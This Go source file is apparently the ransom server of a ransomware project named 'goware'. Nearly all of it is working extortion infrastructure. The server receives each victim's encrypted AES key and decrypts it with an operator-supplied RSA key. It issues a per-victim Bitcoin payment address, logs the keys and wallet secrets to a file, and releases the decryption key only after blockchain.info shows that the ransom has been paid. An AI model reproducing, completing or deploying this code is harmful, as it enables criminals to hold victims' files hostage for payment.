package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/big"
	"net/http"
	"net/url"
	"os"
	"strconv"

	"github.com/nikola43/goware/models"
	"github.com/nikola43/goware/network"
	"github.com/nikola43/goware/utils"
	"github.com/tkanos/gonfig"
)

var Key rsa.PrivateKey

func init() {
	Key = rsa.PrivateKey{
		PublicKey: rsa.PublicKey{
			N: utils.FromBase10(""), // modify this
			E: 65537,
		},
		D: utils.FromBase10(""), // this too
		Primes: []*big.Int{
			utils.FromBase10(""), // also this
			utils.FromBase10(""), // yep, you have to take care of this too
		},
	}
	Key.Precompute()
}

var configuration = models.Configuration{}
var victims = map[string]models.Victim{}

func handler(w http.ResponseWriter, req *http.Request) {
	if req.URL.Path != "/key/" {
		http.Error(w, "404 not found.", http.StatusNotFound)
		return
	}

	switch req.Method {
	case "POST":
		err := req.ParseForm()
		if err != nil {
			panic(err)
		}

		key, err := hex.DecodeString(req.FormValue("key"))
		if err != nil {
			log.Println("[err] Unable to decode key string from hex.")
			return
		}

		id := req.FormValue("id")
		if id == "" {
			log.Println("[err] Got an empty id.")
			return
		}
		log.Println("Got a new key from", id, "! Decrypting it..")

		aes_key, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, &Key, key, nil)
		if err != nil {
			log.Println("[err] Unable to decrypt key.")
			return
		}
		log.Printf("Key decrypted succesfuly: %x\n", aes_key)

		wif, err := network.Networks["btc"].CreatePrivateKey()
		if err != nil {
			log.Fatal(err)
		}
		log.Printf("Generated private address: %s\n", wif.String())

		address, err := network.Networks["btc"].GetAddress(wif)
		if err != nil {
			log.Fatal(err)
		}
		log.Printf("Generated public address: %s\n", address.EncodeAddress())

		victims[id] = models.Victim{
			wif.String(),
			address.EncodeAddress(),
			aes_key,
		}
		json.NewEncoder(w).Encode(models.PaymentInfo{
			victims[id].Address,
			strconv.Itoa(configuration.Satoshi),
		})
		log.Println("Payment information sent!")

		f, err := os.OpenFile("log.txt", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
		if err != nil {
			log.Fatal(err)
		}
		defer f.Close()

		text := "ID: " + id + "\nAes Key: " + hex.EncodeToString(aes_key) + "\nPrivate Key: " + wif.String() + "\n\n"

		if _, err = f.WriteString(text); err != nil {
			log.Fatal(err)
		}
		log.Println("Successfully saved to file.")
	case "GET":
		keys, ok := req.URL.Query()["id"]
		if !ok || len(keys[0]) < 1 {
			log.Println("Url Param 'id' is missing")
			return
		}
		id := keys[0]

		if _, ok := victims[id]; !ok {
			log.Println("Invalid ID:", id)
			return
		}
		payload := url.Values{}
		payload.Set("confirmations", strconv.Itoa(configuration.Confirmations))

		resp, err := http.Get("https://blockchain.info/q/addressbalance/" + victims[id].Address + "?" + payload.Encode())
		if err != nil {
			log.Fatal(err)
		}
		responseData, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		amount, err := strconv.Atoi(string(responseData))
		if err != nil {
			log.Fatal(err)
		}

		if amount >= configuration.Satoshi {
			log.Printf("Sending decryption key to: %s", id)
			fmt.Fprintf(w, hex.EncodeToString(victims[id].Key))
		}
	default:
		fmt.Fprintf(w, "Sorry, only GET and POST methods are supported.")
	}
}

func main() {
	err := gonfig.GetConf("config.json", &configuration)
	if err != nil {
		log.Fatal(err)
	}
	http.HandleFunc("/key/", handler)

	log.Println("Starting server and listening on port 1337")
	log.Fatal(http.ListenAndServe(":1337", nil))
}
